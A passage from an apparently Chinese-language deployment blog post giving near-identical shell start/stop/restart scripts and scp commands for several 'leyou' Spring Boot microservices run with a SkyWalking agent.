then</span><br><span class="line">echo &#x27;Stop Process...&#x27;</span><br><span class="line">kill -15 $tpid</span><br><span class="line">fi</span><br><span class="line">sleep 5</span><br><span class="line">tpid=`ps -ef|grep $RESOURCE_NAME|grep -v grep|grep -v kill|awk &#x27;&#123;print $2&#125;&#x27;`</span><br><span class="line">if [ $&#123;tpid&#125; ]; then</span><br><span class="line">echo &#x27;Kill Process!&#x27;</span><br><span class="line">kill -9 $tpid</span><br><span class="line">else</span><br><span class="line">echo &#x27;Stop Success!&#x27;</span><br><span class="line">fi</span><br><span class="line"> </span><br><span class="line">tpid=`ps -ef|grep $RESOURCE_NAME|grep -v grep|grep -v kill|awk &#x27;&#123;print $2&#125;&#x27;`</span><br><span class="line">if [ $&#123;tpid&#125; ]; then</span><br><span class="line">    echo &#x27;App is running.&#x27;</span><br><span class="line">else</span><br><span class="line">    echo &#x27;App is NOT running.&#x27;</span><br><span class="line">fi</span><br><span class="line"> </span><br><span class="line">rm -f tpid</span><br><span class="line">nohup java -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-gateway -Dskywalking.collector.backend_service=81.68.97.129:11800 -jar ./$RESOURCE_NAME --spring.profiles.active=product &amp;</span><br><span class="line">echo $! &gt; tpid</span><br></pre></td></tr></table></figure>

<h3 id="Ly-gateway-1"><a href="#Ly-gateway-1" class="headerlink" title="Ly-gateway"></a>Ly-gateway</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">10010</span></span><br><span class="line">scp ly-gateway-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-gateway.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-gateway.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">这里可替换为你自己的执行程序,其他代码无需更改</span> </span><br><span class="line">APP_NAME=ly-gateway-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-gateway -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-gateway.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">使用说明,用来提示输入参数</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh 执行脚本.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">检查程序是否在运行</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果不存在返回1,存在返回0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动方法</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">停止方法</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">输出运行状态</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">根据输入参数,选择执行对应方法,不输入则执行使用说明</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>



<h3 id="Ly-auth-service"><a href="#Ly-auth-service" class="headerlink" title="Ly-auth-service"></a>Ly-auth-service</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">10010</span></span><br><span class="line">scp ly-auth-service-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-auth-service.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-auth-service.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">这里可替换为你自己的执行程序,其他代码无需更改</span> </span><br><span class="line">APP_NAME=ly-auth-service-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-auth-service -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-auth-service.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">使用说明,用来提示输入参数</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh 执行脚本.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">检查程序是否在运行</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果不存在返回1,存在返回0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动方法</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">停止方法</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">输出运行状态</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">根据输入参数,选择执行对应方法,不输入则执行使用说明</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="Ly-item-service"><a href="#Ly-item-service" class="headerlink" title="Ly-item-service"></a>Ly-item-service</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">10010</span></span><br><span class="line">scp ly-item-service-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-item-service.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-item-service.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">这里可替换为你自己的执行程序,其他代码无需更改</span> </span><br><span class="line">APP_NAME=ly-item-service-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms512m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-item-service -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-item-service.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">使用说明,用来提示输入参数</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh 执行脚本.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">检查程序是否在运行</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果不存在返回1,存在返回0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动方法</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">停止方法</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">输出运行状态</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">根据输入参数,选择执行对应方法,不输入则执行使用说明</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="Ly-page"><a href="#Ly-page" class="headerlink" title="Ly-page"></a>Ly-page</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">10010</span></span><br><span class="line">scp ly-page-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-page.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-page.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">这里可替换为你自己的执行程序,其他代码无需更改</span> </span><br><span class="line">APP_NAME=ly-page-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms512m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-page -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-page.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">使用说明,用来提示输入参数</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh 执行脚本.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">检查程序是否在运行</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果不存在返回1,存在返回0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动方法</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">停止方法</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">输出运行状态</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">根据输入参数,选择执行对应方法,不输入则执行使用说明</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="Ly-qurtz"><a href="#Ly-qurtz" class="headerlink" title="Ly-qurtz"></a>Ly-qurtz</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">10030</span></span><br><span class="line">scp ly-qurtz-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-qurtz.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-qurtz.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">这里可替换为你自己的执行程序,其他代码无需更改</span> </span><br><span class="line">APP_NAME=ly-qurtz-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx256m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-qurtz -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-qurtz.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">使用说明,用来提示输入参数</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh 执行脚本.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">检查程序是否在运行</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果不存在返回1,存在返回0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动方法</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">停止方法</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">输出运行状态</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">根据输入参数,选择执行对应方法,不输入则执行使用说明</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="Ly-search"><a href="#Ly-search" class="headerlink" title="Ly-search"></a>Ly-search</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">10010</span></span><br><span class="line">scp ly-search-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-search.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-search.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">这里可替换为你自己的执行程序,其他代码无需更改</span> </span><br><span class="line">APP_NAME=ly-search-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-search -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-search.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">使用说明,用来提示输入参数</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh 执行脚本.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">检查程序是否在运行</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果不存在返回1,存在返回0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动方法</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">停止方法</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">输出运行状态</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">根据输入参数,选择执行对应方法,不输入则执行使用说明</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="ly-sms"><a href="#ly-sms" class="headerlink" title="ly-sms"></a>ly-sms</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">8075</span></span><br><span class="line">scp ly-sms-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-sms.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-sms.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">这里可替换为你自己的执行程序,其他代码无需更改</span> </span><br><span class="line">APP_NAME=ly-sms-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx300m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-sms -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-sms.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">使用说明,用来提示输入参数</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh 执行脚本.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">检查程序是否在运行</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果不存在返回1,存在返回0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动方法</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">停止方法</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">输出运行状态</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else 